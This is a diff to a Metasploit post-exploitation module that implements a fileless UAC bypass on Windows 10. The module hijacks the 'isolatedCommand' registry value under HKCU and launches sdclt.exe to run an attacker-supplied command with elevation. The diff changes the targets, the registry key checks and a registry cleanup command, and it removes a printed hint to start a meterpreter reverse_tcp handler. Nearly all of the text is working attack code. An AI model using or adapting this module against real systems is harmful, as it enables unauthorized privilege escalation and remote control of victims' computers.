@@ -10,7 +10,7 @@
 # Exploit Title  : enigma_fileless_IsolatedCommand.rb
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
 # Vuln discover  : enigma0x3 | @mattifestation
-# Tested on      : Windows 7 | Windows 8 | Windows 10
+# Only works againt: Windows 10
 # POC: https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
 #
 #
@@ -112,7 +112,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'enigma fileless uac bypass [sdclt.exe]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe or powershell.exe. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -128,10 +128,8 @@ class MetasploitModule < Msf::Post
                         'Privileged'     => 'false', # thats no need for privilege escalation..
                         'Targets'        =>
                                 [
-                                         # Tested againts windows 7 | Windows 8 | Windows 10
-                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
+                                         [ 'Windows 10' ] # Only works againts Windows 10
                                 ],
-                        'DefaultTarget'  => '6', # default its to run againts windows 10
                         'References'     =>
                                 [
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
@@ -206,12 +204,12 @@ chec_hive
     # search in target regedit if eventvwr calls mmc.exe
     print_warning("Reading process registry hive keys ..")
     Rex::sleep(1.0)
-    if registry_enumkeys("HKCU\\Software\\Classes\\exefile\\shell\\runas\\command")
+    if registry_enumkeys("HKCU\\Software\\Classes\\exefile")
       print_good(" exec => remote registry hive key found!")
       Rex::sleep(1.0)
     else
       # registry hive key not found, aborting module execution.
-      print_warning("Hive key: HKCU\\Software\\Classes\\exefile\\shell\\runas\\command (mmc.exe call)")
+      print_warning("Hive key: HKCU\\Software\\Classes\\exefile (mmc.exe call)")
       print_error("[ABORT]: module cant find the registry hive key needed ..")
       print_error("System does not appear to be vulnerable to the exploit code!")
       print_line("")
@@ -272,7 +270,6 @@ chec_hive
 
     # close channel when done
     print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
-    print_warning("execute: handler -P port -H host -p windows/meterpreter/reverse_tcp")
     print_warning("execute: shell")
     print_warning("execute: start #{vul_serve} /KickOffElev")
     print_line("")
@@ -297,7 +294,7 @@ def ls_stage2
   vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
   vul_value = "isolatedCommand" # vulnerable reg value to create
   chec_hive = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
-  reg_clean = "REG DELETE HKCU\\Software\\Classes\\exefile\\shell\\runas\\command /v #{vul_value} /f" # registry hive to be clean
+  reg_clean = "REG DELETE HKCU\\Software\\Classes\\exefile /f" # registry hive to be clean
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   if datastore['DEL_REGKEY'] == 'nil'
